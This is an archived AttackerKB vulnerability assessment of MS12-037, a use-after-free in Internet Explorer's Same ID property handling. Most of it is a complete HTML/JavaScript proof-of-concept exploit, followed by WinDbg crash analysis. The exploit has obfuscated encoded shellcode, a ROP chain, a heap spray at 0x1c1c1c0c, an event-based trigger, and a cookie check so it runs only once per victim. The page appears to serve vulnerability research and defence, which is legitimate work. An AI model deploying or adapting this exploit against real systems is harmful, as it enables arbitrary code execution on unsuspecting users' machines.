---
title: MS12-037 Microsoft Internet Explorer Same ID Property Deleted Object Handling Memory Corruption
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
topic_disclosure_date: '2012-06-12T22:55:00'
created: '2019-09-12T18:07:42.189232'
revision_date: '2020-02-13T17:12:12.123856'
assessment_id: e02947f2-605f-4a9f-9fcc-b581c8b7f9da
topic_id: 86f6b513-5cd4-4249-98fd-f14e9b841b85
topic_short_id: WyiMG5q7hi
topic_slug: ms12-037-microsoft-internet-explorer-same-id-property-deleted-object-handling-memory-corruption
akb_topic_url: https://attackerkb.com/topics/WyiMG5q7hi/ms12-037-microsoft-internet-explorer-same-id-property-deleted-object-handling-memory-corruption
akb_assessment_url: https://attackerkb.com/topics/WyiMG5q7hi/ms12-037-microsoft-internet-explorer-same-id-property-deleted-object-handling-memory-corruption#e02947f2-605f-4a9f-9fcc-b581c8b7f9da
---

# MS12-037 Microsoft Internet Explorer Same ID Property Deleted Object Handling Memory Corruption

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/WyiMG5q7hi/ms12-037-microsoft-internet-explorer-same-id-property-deleted-object-handling-memory-corruption#e02947f2-605f-4a9f-9fcc-b581c8b7f9da).*

---

A memory corruption flaw exists in Microsoft Internet Explorer. The program fails to sanitize
user-supplied input when handling the Same ID property, resulting in memory corruption. With a
specially crafted web page which accesses a deleted object, a context-dependent attacker can
execute arbitrary code.

# Discovered by

* Qof VulnHunt for reporting the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)
* Qihoo 360 Security Center for working with us on the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)
* Yichong Lin of McAfee Labs for working with us on the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)
* Google Inc. for working with us on the Same ID Property Remote Code Execution Vulnerability (CVE-2012-1875)

# PoC

http://pastebin.com/raw.php?i=sFqxs4qx

```html
<HTML>

    <BODY>
        <title></title>
        <DIV id=testfaild>
            <img id="imgTest" style="display:none">
            <a href="javascript:OnTest();" id="MyA" onClick="OnTest();"><div style="background-color:#FFFFFF; width:30; height:40" id="imgTest" src="" onMouseOver="OnTest2();" onMouseOut="OnTest2();"></div></a>
        </DIV>
        <SCRIPT LANGUAGE="JavaScript">
            function S(dword) {
                var t = unescape;
                var d = Number(dword).toString(16);
                while (d.length < 8) d = '0' + d;
                return t('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
            }
            function OnTest() {
                var tag = 0x1c1c1c0c;
                var vtable1 = S(tag) + '1234567555555555588888888';
                var divs = new Array();
                for (var i = 0; i < 128; i++) divs.push(document.createElement('div'));
                testfaild.innerHTML = testfaild.innerHTML;
                divs[0].className = vtable1;
                divs[1].className = vtable1;
                divs[2].className = vtable1;
                divs[3].className = vtable1;
            }
            function OnTest2() {
                eval("imgTest").src = "";
            }
            function setcookie() {
                var Then = new Date() Then.setTime(Then.getTime() + 1000 * 3600 * 24 * 3) document.cookie = "Cookie1=hellofckworld;expires=" + Then.toGMTString()
            }
            function readcookie() {
                var cookieString = new String(document.cookie);
                if (cookieString.indexOf("hellofckworld") == -1) {
                    return 0
                } else {
                    return 1;
                }
            }
            function trigger() {
                var x = document.getElementsByTagName("div");
                var fireOnThis = document.getElementById("MyA");
                if (document.createEvent) {
                    evObj = document.createEvent('MouseEvents');
                    evObj.iniEvent('click', true, false);
                    fireOnThis.dispatchEvent(evObj);
                } else if (document.createEventObject) {
                    x[1].fireEvent('onMouseOver');
                    fireOnThis.fireEvent('onclick');
                    x[1].fireEvent('onMouseOut');
                }
            }
            function main() {
                if (readcookie()) return;
                ConVertData = window["\x75\x6e\x65\x73\x63\x61\x70\x65"];
                var vbc = ("NewYoukv10ebNewYoukv4b5bNewYoukvc933NewYoukvb966NewYoukv01d9NewYoukv3480NewYoukv990bNewYoukvfae2NewYoukv05ebNewYoukvebe8NewYoukvffffNewYoukvcfffNewYoukvcbceNewYoukv50aaNewYoukv12fdNewYoukva9e8NewYoukvef12NewYoukv1295NewYoukv85efNewYoukvc712NewYoukv1291NewYoukvb9e7NewYoukvaf12NewYoukve618NewYoukvaa95NewYoukvab99NewYoukvec99NewYoukvc376NewYoukvc7c6NewYoukvf370NewYoukv9998NewYoukvc099NewYoukv3010NewYoukv9b99NewYoukv9999NewYoukv2010NewYoukv9b9dNewYoukv9999NewYoukv2810NewYoukv9b91NewYoukv9999NewYoukv7012NewYoukv6412NewYoukv9cf3NewYoukv71c0NewYoukv989dNewYoukv9999NewYoukv607bNewYoukvcc12NewYoukv1a99NewYoukv9c5bNewYoukvb872NewYoukv14c2NewYoukv62d4NewYoukvf6f1NewYoukv99f7NewYoukvf199NewYoukvebecNewYoukvf4f5NewYoukvc8cdNewYoukv6612NewYoukv12ccNewYoukv5f75NewYoukvf198NewYoukvc010NewYoukv5f98NewYoukv9cd8NewYoukv665aNewYoukv717bNewYoukv6643NewYoukv6666NewYoukv4112NewYoukv98f3NewYoukv71c0NewYoukv9953NewYoukv9999NewYoukv607bNewYoukv1c14NewYoukv9898NewYoukv9999NewYoukvf1c9NewYoukv9899NewYoukv9999NewYoukvcc66NewYoukv109dNewYoukv651cNewYoukv9999NewYoukv5e99NewYoukv9c1dNewYoukv9898NewYoukv9999NewYoukve9ecNewYoukvf8fdNewYoukv1d5eNewYoukv9c9cNewYoukv9998NewYoukved99NewYoukvb7fcNewYoukv5efcNewYoukv9c1dNewYoukv9890NewYoukv9999NewYoukvfce1NewYoukv9999NewYoukvcc12NewYoukv1a8dNewYoukv9c5bNewYoukvbf72NewYoukv14c2NewYoukv62d4NewYoukv6faaNewYoukvcfcfNewYoukv1c14NewYoukv9898NewYoukv9999NewYoukv14c9NewYoukv81dcNewYoukvcfc9NewYoukv12c8NewYoukvcc66NewYoukv7512NewYoukv985fNewYoukv10f1NewYoukv98c0NewYoukvd85fNewYoukv5a9cNewYoukv7b66NewYoukv4c71NewYoukv6666NewYoukv1266NewYoukv91ccNewYoukv5b1aNewYoukv729cNewYoukvc2aaNewYoukvd414NewYoukvcf62NewYoukv1c12NewYoukv9965NewYoukv9999NewYoukv1c5fNewYoukv9899NewYoukv9999NewYoukv5fbbNewYoukv9c1dNewYoukv9892NewYoukv9999NewYoukv14bbNewYoukv991cNewYoukv9998NewYoukvc999NewYoukv12c8NewYoukvcc66NewYoukv7512NewYoukv985fNewYoukv10f1NewYoukv98c0NewYoukvd85fNewYoukv5a9cNewYoukv7b66NewYoukv5171NewYoukv6666NewYoukv1266NewYoukv9934NewYoukv999bNewYoukv1299NewYoukv9d24NewYoukv999bNewYoukv1299NewYoukv912cNewYoukv999bNewYoukv1299NewYoukv1a7cNewYoukv8975NewYoukv9921NewYoukv6796NewYoukvaae6NewYoukv5a42NewYoukvccc8NewYoukvea12NewYoukv12a5NewYoukv87edNewYoukv9ae1NewYoukvcf6aNewYoukvef12NewYoukv9ab9NewYoukvaa6aNewYoukvd050NewYoukv34d8NewYoukv5a9aNewYoukv74aaNewYoukv2796NewYoukva389NewYoukved4fNewYoukv5891NewYoukv9e54NewYoukv739aNewYoukv72d9NewYoukva268NewYoukvecb6NewYoukvc77eNewYoukvf712NewYoukv9abdNewYoukvff72NewYoukvd512NewYoukv99d4NewYoukvf712NewYoukv9a85NewYoukv1272NewYoukv14ddNewYoukv9a99NewYoukv325aNewYoukvc0c4NewYoukv715aNewYoukv6708NewYoukv6666NewYoukvedabNewYoukv9508NewYoukv7ba0NewYoukv1ae4NewYoukvb6c8NewYoukv983bNewYoukvfc39NewYoukv520eNewYoukv10faNewYoukvd648NewYoukv4f19NewYoukv0336NewYoukvedf1NewYoukve9edNewYoukvb6a3NewYoukveeb6NewYoukveeeeNewYoukvefb7NewYoukvf5f0NewYoukvf8f5NewYoukvfefeNewYoukvf4f0NewYoukvf7f8NewYoukvf8f0NewYoukvf0b7NewYoukvb6edNewYoukvf4f0NewYoukvb6feNewYoukvf6fbNewYoukvf2f6NewYoukvb7eaNewYoukvf8faNewYoukv99fb");
                var xbc = ConVertData(vbc.replace(/NewYoukv/g, "%u"));
                var a = new Array();
                var ls = 0x100000 - (xbc.length * 2 + 0x01020);
                var bc = S(0x1c1c1c0c);
                var pad = S(0x1c1c1c0c);
                while (pad.length < 0x3000) pad += pad;
                bc = pad.substring(0, (0x1c0c - 0x24) / 2);
                var language;
                if (navigator.appName == 'Netscape') language = navigator.language;
                else language = navigator.browserLanguage;
                var myStr = ("NewYoukvef5bNewYoukv77c1NewYoukvf519NewYoukv77c1NewYoukv1118NewYoukv77c1NewYoukv3e25NewYoukv77c2NewYoukv746aNewYoukv77c3NewYoukv1c8cNewYoukv1c1cNewYoukv1c8cNewYoukv1c1cNewYoukv1000NewYoukv0000NewYoukv0040NewYoukv0000NewYoukv1c4cNewYoukv1c1cNewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv0000NewYoukv5ed5NewYoukv77c1NewYoukv9090NewYoukv9090NewYoukv9090NewYoukv9090NewYoukv9090NewYoukv9090");
                myStr = ConVertData(myStr.replace(/NewYoukv/g, "%u"));
                bc += myStr;
                bc += xbc;
                bc += S(0) + S(0);
                var b = S(0x1c1c1c0c);
                while (b.length < 0x10000) {
                    b += b;
                }
                bc = bc + b;
                b = bc.substring(0, 0x10000 / 2);
                while (b.length < ls) {
                    b += b;
                }
                var lh = b.substring(0, ls / 2);
                delete b;
                delete pad;
                lh = lh + xbc;
                for (var i = 0; i < 0x1c0; i++) a[i] = lh.substr(0, lh.length);
                setTimeout("trigger();", 1000);
                setcookie();
            }
            main();
        </SCRIPT>
    </BODY>

</HTML>
```


# Details


Crash

```
(a9c.998): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export
symbols for C:\WINDOWS\system32\mshtml.dll -
eax=1c1c1c0c ebx=00000000 ecx=02fdf588 edx=00000001 esi=02fdf588 edi=020bbaf0
eip=6363fcc6 esp=020bba88 ebp=020bba94 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!DllGetClassObject+0xafd09:
6363fcc6 8b5070          mov     edx,dword ptr [eax+70h]
ds:0023:1c1c1c7c=????????
```

SPRAY HOW TO

```
0:008> db 1c1c1024 L1000
1c1c1024  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
.
.
.
2023
```

Digging into the crash

```
0:008> kb
ChildEBP RetAddr  Args to Child
020bba84 63660eed 80020003 00176778 020bbaa4 mshtml!CElement::Doc+0x2
020bba94 63660f5a 00000000 00000348 020bbaf8 mshtml!CElement::GetAtomTable+0x10
020bbaa4 635b6bb7 033b49ac 00000003 00176701 mshtml!CCollectionCache::GetAtomFromName+0x15
020bbaf8 635e7b76 0023f4d8 033b49ac 00000003 mshtml!CCollectionCache::GetIntoAry+0x74
020bbb3c 635e7c20 0000000e 033b49ac 020bbc28 mshtml!CCollectionCache::GetDispID+0x13e
020bbb50 635d36b0 0023f4d8 0000000e 033b49ac mshtml!DispatchGetDispIDCollection+0x3f
020bbb78 63643d3e 03137230 033b49ac 10000003 mshtml!CElementCollectionBase::VersionedGetDispID+0x46
020bbbb8 633a9eb2 03137260 033b49ac 10000003 mshtml!PlainGetDispID+0xdc
020bbbe8 633a9e13 033b49ac 020bbc28 03137260 jscript!IDispatchExGetDispID+0xb7
020bbc04 633a9f17 008da788 020bbc28 00000003 jscript!GetDex2DispID+0x34
020bbc30 633a77ff 008da788 020bbc64 0000000c jscript!VAR::InvokeByName+0xeb
020bbc78 633a75bf 008da788 0000000c 00000000 jscript!VAR::InvokeDispName+0x7a
020bbe0c 633a5ab0 020bbe24 020bbf6c 020bbf6c jscript!CScriptRuntime::Run+0x1f27
020bbef4 633a59f7 020bbf6c 00000000 008de830 jscript!ScrFncObj::CallWithFrameOnStack+0xff
020bbf40 633a5743 020bbf6c 00000000 008de830 jscript!ScrFncObj::Call+0x8f
020bbfbc 633a8bc7 008dc830 020be3b8 00000000 jscript!CSession::Execute+0x175
020bc0a4 633a8a35 008dc830 00000000 00000001 jscript!NameTbl::InvokeDef+0x1b8
020bc128 633a6d37 008dc830 00000000 00000001 jscript!NameTbl::InvokeEx+0x129
020bc168 633a6c75 008da788 00000000 00000001 jscript!IDispatchExInvokeEx2+0xf8
020bc1a4 63399186 008da788 00000001 00000001 jscript!IDispatchExInvokeEx+0x6a
020bc234 635fe083 020bc1f8 00000004 00000001 jscript!NameTbl::InvokeEx+0x372
020bc26c 635fdfab 02dc8a18 00000001 00000001 mshtml!CScriptCollection::InvokeEx+0x8a
020be2e0 63642f30 02d1e060 00002712 00000001 mshtml!CWindow::InvokeEx+0x6a9
020be308 63642eec 02d1e060 00002712 00000001 mshtml!CBase::VersionedInvokeEx+0x20
020be358 63643898 031371a0 00002712 00000001 mshtml!PlainInvokeEx+0xea
020be3c8 636435c4 02d17200 00002712 00000001 mshtml!COmWindowProxy::InvokeEx+0x338
020be3f0 63642f30 02d17200 00002712 00000001 mshtml!COmWindowProxy::subInvokeEx+0x26
020be418 63642eec 02d17200 00002712 00000001 mshtml!CBase::VersionedInvokeEx+0x20
020be468 633a6d37 0020d2e0 00002712 00000001 mshtml!PlainInvokeEx+0xea
020be4a8 633a6c75 008da788 00002712 00000409 jscript!IDispatchExInvokeEx2+0xf8
020be4e4 633a9cfe 008da788 00000409 00000001 jscript!IDispatchExInvokeEx+0x6a
020be5a4 633a9d79 00002712 00000001 00000000 jscript!InvokeDispatchEx+0x98
020be5d0 633a9c0b 008da788 00000000 00000001 jscript!VAR::InvokeByDispID+0x154
020be76c 633a5ab0 020be784 020be8cc 020be8cc jscript!CScriptRuntime::Run+0x2989
020be854 633a59f7 020be8cc 00000000 008de8d0 jscript!ScrFncObj::CallWithFrameOnStack+0xff
020be8a0 633a5743 020be8cc 00000000 008de8d0 jscript!ScrFncObj::Call+0x8f
020be91c 633a8bc7 033a6348 020beb60 00000000 jscript!CSession::Execute+0x175
020bea04 633a8a35 033a6348 00000000 00000001 jscript!NameTbl::InvokeDef+0x1b8
020bea88 635c3039 033a6348 00000000 00000409 jscript!NameTbl::InvokeEx+0x129
020bead8 635c2f51 03182d38 033a6348 00000000 mshtml!CBase::InvokeDispatchWithThis+0x1e0
020bec04 636294ce 80010009 80011771 03137710 mshtml!CBase::InvokeEvent+0x213
020bed64 635f377c 03182d38 02d03060 03182d38 mshtml!CBase::FireEvent+0xe2
020beddc 6362b142 03182d38 02dc8f40 ffffffff mshtml!CElement::BubbleEventHelper+0x2e3
020bef40 63783dd6 63649344 00000000 02dc8f40 mshtml!CElement::FireEvent+0x2d1
020bf080 638e6827 03182d38 033b4b88 020bf0b8 mshtml!CElement::fireEvent+0x185
020bf0c8 636430c9 03182d38 008d8f80 031371d0 mshtml!Method_VARIANTBOOLp_BSTR_o0oVARIANTp+0xfb
020bf13c 6366418a 03182d38 80010452 00000001 mshtml!CBase::ContextInvokeEx+0x5d1
020bf18c 6362b6ce 03182d38 80010452 00000001 mshtml!CElement::ContextInvokeEx+0x9d
020bf1b8 63642eec 03182d38 80010452 00000001 mshtml!CElement::VersionedInvokeEx+0x2d
020bf208 633a6d37 03137620 80010452 00000001 mshtml!PlainInvokeEx+0xea
020bf248 633a6c75 008da788 80010452 00000409 jscript!IDispatchExInvokeEx2+0xf8
020bf284 633a9cfe 008da788 00000409 00000001 jscript!IDispatchExInvokeEx+0x6a
020bf344 633a9f3c 80010452 00000001 00000000 jscript!InvokeDispatchEx+0x98
020bf378 633a77ff 008da788 020bf3ac 00000001 jscript!VAR::InvokeByName+0x135
020bf3c4 633a85c7 008da788 00000001 00000000 jscript!VAR::InvokeDispName+0x7a
020bf3f4 633a9c0b 008da788 00000000 00000001 jscript!VAR::InvokeByDispID+0xce
020bf590 633a5ab0 020bf5a8 00000000 00000000 jscript!CScriptRuntime::Run+0x2989
020bf678 633a59f7 00000000 00000000 008de980 jscript!ScrFncObj::CallWithFrameOnStack+0xff
020bf6c4 633a92f7 00000000 00000000 008de980 jscript!ScrFncObj::Call+0x8f
020bf748 633a6650 008defa8 008da788 00000001 jscript!NameTbl::InvokeInternal+0x137
020bf778 633a9c0b 008da788 00000000 00000001 jscript!VAR::InvokeByDispID+0x17c
020bf914 633a5ab0 020bf92c 020bfa74 020bfa74 jscript!CScriptRuntime::Run+0x2989
020bf9fc 633a59f7 020bfa74 00000000 00000000 jscript!ScrFncObj::CallWithFrameOnStack+0xff
020bfa48 633a5743 020bfa74 00000000 00000000 jscript!ScrFncObj::Call+0x8f
020bfac4 633a8bc7 008dedc0 020bfcd4 00000000 jscript!CSession::Execute+0x175
020bfbac 633a8a35 008dedc0 00000000 00000001 jscript!NameTbl::InvokeDef+0x1b8
020bfc30 633a9153 008dedc0 00000000 00000000 jscript!NameTbl::InvokeEx+0x129
020bfc58 636867fa 008dedc0 00000000 63633600 jscript!NameTbl::Invoke+0x70
020bfcec 6368675a 02d1e060 02decc60 00239040 mshtml!CWindow::ExecuteTimeoutScript+0x87
020bfd44 6368664a 02d1e060 02d1e0a2 020bfd78 mshtml!CWindow::FireTimeOut+0xb6
020bfd54 63686656 0000202b 020bfde0 6363c317 mshtml!CStackPtrAry<unsigned long,12>::GetStackSize+0xb6
020bfd78 7e418734 001005d8 00000011 0000202b mshtml!GlobalWndProc+0x183
020bfda4 7e418816 6363c317 001005d8 00000113 USER32!InternalCallWinProc+0x28
020bfe0c 7e4189cd 00000000 6363c317 001005d8 USER32!UserCallWinProcCheckWow+0x150
020bfe6c 7e418a10 020bfe94 00000000 020bfeec USER32!DispatchMessageWorker+0x306
020bfe7c 01252ec9 020bfe94 00000000 008d5d00 USER32!DispatchMessageW+0xf
020bfeec 011f48bf 001703f8 00000001 00150390 IEFRAME!CTabWindow::_TabWindowThreadProc+0x461
020bffa4 5de05a60 008d5d00 0fbc002f 020bffec IEFRAME!LCIETab_ThreadProc+0x2c1
020bffb4 7c80b713 00150390 00000001 0fbc002f iertutil!CIsoScope::RegisterThread+0xab
020bffec 00000000 5de05a52 00150390 00000000 kernel32!BaseThreadStart+0x37
```

Crashing here in IE8 XP SP3

```
.text:6363FCC4 ; public: class CDoc * __thiscall CElement::Doc(void)const
.text:6363FCC4                 mov     eax, [ecx]
.text:6363FCC6                 mov     edx, [eax+70h]
.text:6363FCC9                 call    edx
.text:6363FCCB                 mov     eax, [eax+0Ch]
.text:6363FCCE                 retn
```


# References

http://www.osvdb.org/show/osvdb/82865
